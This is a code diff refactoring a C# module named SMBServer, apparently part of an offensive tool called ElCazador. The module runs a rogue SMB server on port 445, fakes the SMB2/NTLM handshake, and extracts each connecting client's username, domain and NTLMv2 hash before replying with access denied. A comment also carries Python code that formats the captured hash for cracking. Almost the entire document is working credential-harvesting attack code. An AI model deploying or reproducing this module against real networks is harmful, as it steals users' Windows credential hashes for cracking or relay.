@@ -4,37 +4,41 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
+using ElCazador.Worker.Interfaces;
 using ElCazador.Worker.Models;
 using ElCazador.Worker.Modules.Servers.Models;
 using ElCazador.Worker.Utils;
 
 namespace ElCazador.Worker.Modules.Servers
 {
-    internal class SMBServer : IModule
+    internal class SMBServer : AbstractModule, IModule
     {
         private static ManualResetEvent mre = new ManualResetEvent(false);
         private Socket Socket { get; set; }
         public bool IsEnabled => true;
 
+        public SMBServer(IWorkerController controller) : base(controller, "SMBServer") { }
 
-        public void Run()
+
+        public async Task Run()
         {
-            StartSocket();
+            await StartSocket();
         }
 
-        private void StartSocket()
+        private async Task StartSocket()
         {
-            // Data buffer for incoming data.  
-            byte[] bytes = new Byte[1024];
-            IPEndPoint localEndPoint = new IPEndPoint(Worker.IP, 445);
-
-            // Create a TCP/IP socket.  
-            Socket listener = new Socket(localEndPoint.Address.AddressFamily,
-                SocketType.Stream, ProtocolType.Tcp);
-
-            // Bind the socket to the local endpoint and listen for incoming connections.  
             try
             {
+                // Data buffer for incoming data.  
+                byte[] bytes = new Byte[1024];
+                IPEndPoint localEndPoint = new IPEndPoint(Controller.WorkerSettings.IP, 445);
+
+                // Create a TCP/IP socket.  
+                Socket listener = new Socket(localEndPoint.Address.AddressFamily,
+                    SocketType.Stream, ProtocolType.Tcp);
+
+                // Bind the socket to the local endpoint and listen for incoming connections.  
                 listener.Bind(localEndPoint);
                 listener.Listen(100);
 
@@ -45,7 +49,7 @@ namespace ElCazador.Worker.Modules.Servers
 
                     // Start an asynchronous socket to listen for connections.  
                     listener.BeginAccept(
-                        new AsyncCallback(AcceptCallback),
+                        new AsyncCallback(async (ar) => await AcceptCallback(ar)),
                         listener);
 
                     // Wait until a connection is made before continuing.  
@@ -55,95 +59,93 @@ namespace ElCazador.Worker.Modules.Servers
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.ToString());
+                await Controller.Log(Name, e.ToString());
             }
         }
 
-        private void AcceptCallback(IAsyncResult ar)
+        private async Task AcceptCallback(IAsyncResult asyncResult)
         {
-            // Signal the main thread to continue.  
-            mre.Set();
-
-            // Get the socket that handles the client request.  
-            Socket listener = (Socket)ar.AsyncState;
-            Socket handler = listener.EndAccept(ar);
-
-            // Create the state object.  
-            SMBPacket state = new SMBPacket();
-            state.Socket = handler;
-            handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
-                new AsyncCallback(ReadCallback), state);
-        }
-
-        private void ReadCallback(IAsyncResult ar)
-        {
-            // Retrieve the state object and the handler socket  
-            // from the asynchronous state object.  
-            SMBPacket state = (SMBPacket)ar.AsyncState;
-            Socket handler = state.Socket;
-
-            // Read data from the client socket.   
-            int bytesRead = 1;//handler.EndReceive(ar);
-
-            if (bytesRead > 0)
+            try
             {
-                if (state.Buffer[8].Equals(SMB2Commands.SMB1NegotiateToSMB2))
-                {
-                    NegotiateSMB1ToSMB2Response(state);
-                }
-                else if (state.Command.SequenceEqual(SMB2Commands.Request))
-                {
-                    NegotiateResponse(state);
-                }
-                else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
-                {
-                    NegotiateNTLMResponse(state);
-                }
-                else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
-                {
-                    ParseHash(state);
-                    SendAccessDenied(state);
+                // Signal the main thread to continue.  
+                mre.Set();
 
-                    if (handler.Connected)
-                    {
-                        handler.EndReceive(ar);
-                        handler.Shutdown(SocketShutdown.Both);
-                    }
+                // Get the socket that handles the client request.  
+                Socket listener = (Socket)asyncResult.AsyncState;
+                Socket handler = listener.EndAccept(asyncResult);
 
-                    return;
-                }
-
+                // Create the state object.  
+                SMBPacket state = new SMBPacket();
+                state.Socket = handler;
                 handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
-                    new AsyncCallback(ReadCallback), state);
+                    new AsyncCallback(async (ar) => await ReadCallback(ar)), state);
+
+                await Task.CompletedTask;
+            }
+            catch (Exception e)
+            {
+                await Controller.Log(Name, e.ToString());
             }
         }
 
-        /*
-                SSPIStart = data[113:]
-    data = data[113:]
-    LMhashLen = struct.unpack('<H',data[12:14])[0]
-    LMhashOffset = struct.unpack('<H',data[16:18])[0]
-    LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
-    NthashLen = struct.unpack('<H',data[22:24])[0]
-    NthashOffset = struct.unpack('<H',data[24:26])[0]
-    SMBHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-    DomainLen = struct.unpack('<H',data[30:32])[0]
-    DomainOffset = struct.unpack('<H',data[32:34])[0]
-    Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
-    UserLen      = struct.unpack('<H',data[38:40])[0]
-    UserOffset   = struct.unpack('<H',data[40:42])[0]
-    Username     = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
-    WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])
-    SaveToDb({
-                'module': 'SMBv2', 
-		'type': 'NTLMv2-SSP', 
-		'client': client, 
-		'user': Domain+'\\'+Username, 
-		'hash': SMBHash, 
-		'fullhash': WriteHash,
-             })
-         */
-        private void ParseHash(SMBPacket packet)
+        private async Task ReadCallback(IAsyncResult asyncResult)
+        {
+            try
+            {
+                // Retrieve the state object and the handler socket  
+                // from the asynchronous state object.  
+                SMBPacket state = (SMBPacket)asyncResult.AsyncState;
+                Socket handler = state.Socket;
+
+                // Read data from the client socket.   
+                int bytesRead = 1;//handler.EndReceive(ar);
+
+                if (bytesRead > 0)
+                {
+                    if (state.Buffer[8].Equals(SMB2Commands.SMB1NegotiateToSMB2))
+                    {
+                        await NegotiateSMB1ToSMB2Response(state);
+                    }
+                    else if (state.Command.SequenceEqual(SMB2Commands.Request))
+                    {
+                        await NegotiateResponse(state);
+                    }
+                    else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
+                    {
+                        await NegotiateNTLMResponse(state);
+                    }
+                    else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
+                    {
+                        await ParseHash(state);
+                        await SendAccessDenied(state);
+
+                        if (handler.Connected)
+                        {
+                            handler.EndReceive(asyncResult);
+                            handler.Shutdown(SocketShutdown.Both);
+                        }
+
+                        return;
+                    }
+                    try
+                    {
+
+                        handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
+                            new AsyncCallback(async (ar) => await ReadCallback(ar)), state);
+                    }
+                    catch (ObjectDisposedException e)
+                    {
+
+                    }
+                }
+            }
+            catch (SocketException e)
+            {
+                await Controller.Log(Name, e.Message);
+            }
+        }
+
+        private async Task ParseHash(SMBPacket packet)
         {
             var auth = packet.Buffer.Skip(113).ToArray();
 
@@ -163,7 +165,7 @@ namespace ElCazador.Worker.Modules.Servers
             short userOffset = BitConverter.ToInt16(auth, 40);
             string user = Encoding.Unicode.GetString(auth.Skip(userOffset).Take(userLen).ToArray());
 
-            Worker.AddHash(new Hash
+            await Controller.Output(Name, new Hash
             {
                 IPAddress = (packet.Socket.RemoteEndPoint as IPEndPoint).Address,
                 User = user,
@@ -175,80 +177,126 @@ namespace ElCazador.Worker.Modules.Servers
         }
 
 
-        private void NegotiateSMB1ToSMB2Response(SMBPacket packet)
+        private async Task NegotiateSMB1ToSMB2Response(SMBPacket packet)
         {
-            var header = new SMB2Header(new byte[] { 0x00, 0x00 });
+            try
+            {
+                var header = new SMB2Header(new byte[] { 0x00, 0x00 });
 
-            var data = new SMB2NegotiateResponse(header.Build()).Build();
+                var data = new SMB2NegotiateResponse(header.Build()).Build();
 
-            Send(packet.Socket, data);
+                await Send(packet.Socket, data);
+            }
+            catch (Exception e)
+            {
+                await Controller.Log(Name, e.ToString());
+            }
         }
 
-        private void NegotiateResponse(SMBPacket packet)
+        private async Task NegotiateResponse(SMBPacket packet)
         {
-            var header = new SMB2Header(
-                new byte[] { 0x00, 0x00 },
-                packet.MessageID,
-                packet.CreditCharge,
-                packet.Credits,
-                packet.ProcessID
-                );
+            try
+            {
 
-            var data = new SMB2NegotiateResponse(
-                header.Build(),
-                new byte[] { 0x10, 0x02 }).Build();
 
-            Send(packet.Socket, data);
+                var header = new SMB2Header(
+                    new byte[] { 0x00, 0x00 },
+                    packet.MessageID,
+                    packet.CreditCharge,
+                    packet.Credits,
+                    packet.ProcessID
+                    );
+
+                var data = new SMB2NegotiateResponse(
+                    header.Build(),
+                    new byte[] { 0x10, 0x02 }).Build();
+
+                await Send(packet.Socket, data);
+            }
+            catch (Exception e)
+            {
+                await Controller.Log(Name, e.ToString());
+            }
         }
 
         // head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=GrabSessionID(data),NTStatus="\x16\x00\x00\xc0")
-        private void NegotiateNTLMResponse(SMBPacket packet)
+        private async Task NegotiateNTLMResponse(SMBPacket packet)
         {
-            var header = new SMB2Header(
-                new byte[] { 0x01, 0x00 },
-                packet.MessageID,
-                packet.CreditCharge,
-                packet.Credits,
-                new byte[] { 0xff, 0xfe, 0x00, 0x00 },
-                packet.SessionID,
-                new byte[] { 0x16, 0x00, 0x00, 0xc0 }
-            );
+            try
+            {
+                var header = new SMB2Header(
+                    new byte[] { 0x01, 0x00 },
+                    packet.MessageID,
+                    packet.CreditCharge,
+                    packet.Credits,
+                    new byte[] { 0xff, 0xfe, 0x00, 0x00 },
+                    packet.SessionID,
+                    new byte[] { 0x16, 0x00, 0x00, 0xc0 }
+                );
 
-            var data = new SMB2NTLMNegotiate(header.Build()).Build();
+                var data = new SMB2NTLMNegotiate(header.Build()).Build();
 
-            Send(packet.Socket, data);
+                await Send(packet.Socket, data);
+            }
+            catch (Exception e)
+            {
+                await Controller.Log(Name, e.ToString());
+            }
         }
 
-        private void SendAccessDenied(SMBPacket packet)
+        private async Task SendAccessDenied(SMBPacket packet)
         {
-            var header = new SMB2Header(
-                new byte[] { 0x01, 0x00 },
-                packet.MessageID,
-                packet.CreditCharge,
-                packet.Credits,
-                new byte[] { 0xff, 0xfe, 0x00, 0x00 },
-                packet.SessionID,
-                new byte[] { 0x22, 0x00, 0x00, 0xc0 }
-            );
+            try
+            {
+                var header = new SMB2Header(
+                    new byte[] { 0x01, 0x00 },
+                    packet.MessageID,
+                    packet.CreditCharge,
+                    packet.Credits,
+                    new byte[] { 0xff, 0xfe, 0x00, 0x00 },
+                    packet.SessionID,
+                    new byte[] { 0x22, 0x00, 0x00, 0xc0 }
+                );
 
-            var data = new SMB2AccessDenied(header.Build()).Build();
+                var data = new SMB2AccessDenied(header.Build()).Build();
 
-            Send(packet.Socket, data);
+                await Send(packet.Socket, data);
+            }
+            catch (Exception e)
+            {
+                await Controller.Log(Name, e.ToString());
+            }
         }
 
-        private void Send(Socket handler, byte[] data)
+        private async Task Send(Socket handler, byte[] data)
         {
-            //TODO: At some point in life figure out why it is trying to send another packet here after the last one.
+            try
+            {
+                //TODO: At some point in life figure out why it is trying to send another packet here after the last one.
 
-            // TODO: THIS IS SHIT! Do something elsero pleaso
-            data = ByteUtils.IntToBigEndian(data.Length).Concat(data).ToArray();
+                // TODO: THIS IS SHIT! Do something elsero pleaso
+                data = ByteUtils.IntToBigEndian(data.Length).Concat(data).ToArray();
 
-            // Begin sending the data to the remote device.  
-            handler.BeginSend(data, 0, data.Length, 0,
-                new AsyncCallback(SendCallback), handler);
+                // Begin sending the data to the remote device.  
+
+                handler.BeginSend(data, 0, data.Length, 0,
+                    new AsyncCallback(async (ar) => await SendCallback(ar)), handler);
+            }
+            catch (SocketException e)
+            {
+                if (e.ErrorCode == 32)
+                {
+                    if (handler.Connected)
+                    {
+                        handler.Shutdown(SocketShutdown.Both);
+                    }
+                }
+            }
+
+            await Task.CompletedTask;
         }
 
-        private void SendCallback(IAsyncResult ar)
+        private async Task SendCallback(IAsyncResult ar)
         {
             try
             {
@@ -260,7 +308,7 @@ namespace ElCazador.Worker.Modules.Servers
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.ToString());
+                await Controller.Log(Name, e.ToString());
             }
         }
     }
